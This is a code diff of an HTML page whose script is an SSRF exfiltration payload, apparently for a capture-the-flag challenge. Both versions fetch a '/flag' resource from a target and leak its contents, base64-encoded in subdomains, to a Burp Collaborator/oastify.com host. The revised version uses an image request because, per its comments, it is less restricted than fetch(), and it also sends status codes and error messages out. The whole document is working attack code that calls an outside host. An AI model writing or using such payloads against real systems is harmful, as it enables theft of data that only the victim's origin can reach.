@@ -1,53 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SSRF Exfiltration Payload</title>
+    <title>SSRF Debugger Payload</title>
 </head>
 <body>
-    <h1>Exfiltrating... please wait.</h1>
+    <h1>Running advanced exfiltration...</h1>
     <script>
         // --- CONFIGURATION ---
-
-        // 1. The full, absolute URL to the resource you want to steal.
         const targetUrl = "https://tar-award-writers-controllers.trycloudflare.com/flag";
+        const collaboratorDomain = "9s21hth5hneqdenop30y7vrh086zuxim.oastify.com"; // <-- IMPORTANT: Change this!
 
-        // 2. Your Burp Collaborator / Oastify domain.
-        //    (I see you're using oastify.com, which is great)
-        const collaboratorDomain = "9u41jtj5jngqfepor32y9vth288zwwkl.oastify.com";
+        // --- ROBUST EXFILTRATION FUNCTION ---
+        // This function creates an image element to make a request, which is often
+        // less restricted than fetch(). We don't add it to the page, we just create it.
+        function exfiltrate(data) {
+            const encodedData = btoa(data).replace(/=/g, ''); // Base64, remove padding
+            new Image().src = `https://${encodedData}.${collaboratorDomain}`;
+        }
 
+        // --- MAIN LOGIC ---
+        async function runExploit() {
+            // 1. Send a "start" signal so we know the script is running.
+            exfiltrate("script-started");
 
-        // --- EXPLOIT LOGIC ---
-        async function exfiltrateData() {
             try {
-                // Fetch the flag from the target's own origin. THIS IS THE KEY FIX.
+                // 2. Attempt to fetch the flag.
                 const response = await fetch(targetUrl);
 
-                if (!response.ok) {
-                    throw new Error(`Flag fetch failed with status: ${response.status}`);
-                }
+                // 3. Send the HTTP status code of the response. This is a crucial debug step.
+                // For example, if it's 404, we'll know the /flag endpoint is wrong.
+                exfiltrate(`response-status-${response.status}`);
 
+                if (!response.ok) {
+                    throw new Error(`Non-200-status`);
+                }
+                
                 const flagText = await response.text();
 
-                // Base64-encode the flag to make it safe for a URL subdomain.
-                const encodedFlag = btoa(flagText.trim());
-
-                // Construct the URL that will leak the data to our server.
-                const exfilUrl = `https://flag-${encodedFlag}.${collaboratorDomain}`;
-
-                // Send the data. We use 'no-cors' mode to prevent the browser
-                // from blocking the request, as we don't care about the response.
-                await fetch(exfilUrl, { mode: 'no-cors' });
+                if (flagText) {
+                    // 4. If we got the flag, send it.
+                    exfiltrate(`flag-${flagText.trim()}`);
+                } else {
+                    // 5. If the response was empty, tell us.
+                    exfiltrate("flag-was-empty");
+                }
 
             } catch (error) {
-                // If anything goes wrong, send the error message to your server.
-                // This is extremely helpful for debugging!
-                const encodedError = btoa(error.message);
-                const errorUrl = `https://error-${encodedError}.${collaboratorDomain}`;
-                await fetch(errorUrl, { mode: 'no-cors' });
+                // 6. If any part of the 'try' block failed, send the error message.
+                exfiltrate(`error-${error.message}`);
             }
         }
 
-        exfiltrateData();
+        runExploit();
     </script>
 </body>
 </html>
